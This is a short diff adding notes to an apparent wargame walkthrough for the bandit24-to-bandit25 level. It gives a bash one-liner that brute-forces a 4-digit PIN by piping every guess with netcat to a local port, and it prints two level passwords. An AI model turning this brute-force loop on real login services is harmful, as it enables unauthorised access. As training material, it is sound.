@@ -1,0 +1,4 @@
+- For this level we need to brute force the authentication mechanism that is running on port ```30002``` for user ```bandit25```
+- The input takes the password for ```bandit24``` and a 4 digit PIN, that we need to bruteforce
+- We write a bash one liner for that: ```for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002```
+- Obtained password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
